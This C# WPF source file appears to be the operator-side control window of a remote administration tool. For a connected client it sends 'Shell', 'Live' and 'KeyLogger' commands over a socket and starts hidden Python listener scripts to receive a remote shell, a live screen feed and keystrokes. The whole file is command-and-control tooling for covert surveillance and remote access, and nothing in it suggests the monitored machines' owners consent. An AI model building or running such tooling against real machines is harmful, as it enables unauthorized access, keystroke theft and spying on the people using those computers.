using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Threading;
using System.IO;
using System.ComponentModel;

namespace GUI
{
    /// <summary>
    /// Interaction logic for Client_Control_Window.xaml
    /// </summary>
    public partial class Client_Control_Window : Window
    {
        private string client_data;
        private string client_id;
        //public delegate void SendCommand_To_Python(string cmd);
        //public event SendCommand_To_Python Send_Command_Event;
        private Client_Python_Listener p;
        private string msg_From_Client;
        private bool port_flag;
        private string Working_Dir;
        private bool busy;
        private bool IsOpen;
        private bool disconnected_flag;
        private bool exit_flag;
        private string ipv4;

        private Process  running_process;

        public Client_Control_Window(string client_data, string client_id, Socket csock, string ipv4)
        {
            InitializeComponent();
            this.client_data = client_data;
            this.client_id = client_id;
            this.ipv4 = ipv4;
            this.msg_From_Client = "";
            this.port_flag = false;
            this.client_info.Content = this.client_data;
            this.p = new Client_Python_Listener(csock);
            this.Working_Dir = Directory.GetCurrentDirectory() + @"\..\..\..\..\..\";
            this.busy = false;
            this.Closing += Window_Closing;
            this.IsOpen = false;
            this.disconnected_flag = false;
            this.exit_flag = false;
            this.running_process = null;
            

        }
        



        //public void ShowMessageBox()
        //{
        //    var thread = new Thread(
        //      () =>
        //      {
        //          string ip = this.client_data.Split(' ')[3];
        //          MessageBox.Show("The client with the following IP:  " + ip + " has been disconnected. his control window has been closed", "Client Disconnected");
        //      });
        //    thread.Start();
        //}

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {

            //if (this.disconnected_flag && this.IsOpen) // client disconnected and the window is oepn
            //{
            //    if (this.running_process != null)
            //        this.running_process.Kill();
            //    //ShowMessageBox();
            //}

             if (this.exit_flag || disconnected_flag) // close the window(with .Close() )
            {
                if (this.running_process != null)
                    this.running_process.Kill();
           
            }
            else
            { 
                if (this.running_process != null)
                    this.running_process.Kill();
                e.Cancel = true;
                this.Visibility = Visibility.Hidden;
                this.IsOpen = false;
            }
        }
                

        private void Shell_But_Thread()
        {
            if (this.busy == false)
            {
                this.busy = true;

                int port = Return_Avilible_Port();
                string file_path_name = @"\Shell\shell_server.py";
                string python_path = @"\Python37-32\python.exe";
                string cmd = this.client_id + " Shell " + port.ToString();

                //if (Send_Command_Event != null)
                //{
                this.p.sendCommand(cmd);
                //}
                Thread t = new Thread(() => LaunchCommandLineApp(port, python_path, file_path_name));
                t.IsBackground = true;
                t.Start();
            }
            else
                MessageBox.Show("Other Funcionality is currently running");
        }

        private void Shell_But_Click(object sender, RoutedEventArgs e)
        {
            Thread shell = new Thread(() => Shell_But_Thread());
            shell.IsBackground = true;
            shell.Start();

        }

        private void Live_Screen_But_Thread()
        {
            if (this.busy == false)
            {
                this.busy = true;
                int port = Return_Avilible_Port();
                string file_path_name = @"\new_monitor\mon_server_1.py";
                string python_path = @"\Python37-32\pythonw.exe";
                string cmd = this.client_id + " Live " + port.ToString();
                //if (Send_Command_Event != null)
                //{
                this.p.sendCommand(cmd);
                //}

                Thread t = new Thread(() => LaunchCommandLineApp(port, python_path, file_path_name));
                t.IsBackground = true;
                
                t.Start();
            }
            else
                MessageBox.Show("Other Funcionality is currently running");
        }

        private void Live_Screen_But_Click(object sender, RoutedEventArgs e)
        {
            Thread ls = new Thread(() => Live_Screen_But_Thread());
            ls.IsBackground = true;
            ls.Start();
        }

        private void Keylogger_But_Thread()
        {
            if (this.busy == false)
            {
                this.busy = true;
                int port = Return_Avilible_Port();
                string file_path_name = @"\KeyLogger\KeyloggerServer.py";
                string python_path = @"\Python27\python.exe";
                string cmd = this.client_id + " KeyLogger " + port.ToString();
                //if (Send_Command_Event != null)
                //{
                this.p.sendCommand(cmd);
                //}

                Thread t = new Thread(() => LaunchCommandLineApp(port, python_path, file_path_name));
                t.IsBackground = true;             
                t.Start();
            }
            else
                MessageBox.Show("Other Funcionality is currently running");
        }


        private void Keylogger_But_Click(object sender, RoutedEventArgs e)
        {
            Thread kl = new Thread(() => Keylogger_But_Thread());
            kl.IsBackground = true;
            kl.Start();

        }



        public void LaunchCommandLineApp(int port, string python_path, string file_path_name)
        {

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = this.Working_Dir + python_path;
                startInfo.Arguments = this.Working_Dir + file_path_name + " " + port.ToString() + " " + this.ipv4;
                startInfo.CreateNoWindow = true;
                // Start the process with the info we specified.
                // Call WaitForExit and then the using statement will close.
                using (Process exeProcess = Process.Start(startInfo))
                {
                    this.running_process = exeProcess;
                    exeProcess.WaitForExit();
                }
            }
            catch
            {
                // Log error.
            }
            this.running_process = null;
            this.busy = false;
        }

        public string Client_ID
        {
            get { return this.client_id; }   // get method
            set { this.client_id = value; }  // set method
        }

        public string Msg
        {
            get { return this.msg_From_Client; }
            set { this.msg_From_Client = value; }
        }
        public string Client_data
        {
            get { return this.client_data; }
        }
        public bool Disconnected_Flag
        {
            set { this.disconnected_flag = value; }
        }

        public bool Busy
        {
            get { return this.busy; }
        }
        public bool Exit_Flag
        {
            set { this.exit_flag = value; }
        }


        int Return_Avilible_Port()
        {
            Random rand = new Random();
            int rnd_port = 0;
            string cmd = "";
            while (true)
            {
                rnd_port = rand.Next(1024, 5001);
                cmd = this.client_id + " PORT " + rnd_port.ToString();
                this.p.sendCommand(cmd);
                while (this.msg_From_Client == "")
                    continue;
                if (this.msg_From_Client == "PORT_SUCCESS")
                    break;
            }
            return rnd_port;
        }



        public bool Isopen
        {
            get { return this.IsOpen; }
            set { this.IsOpen = value; }
        }







    }
}
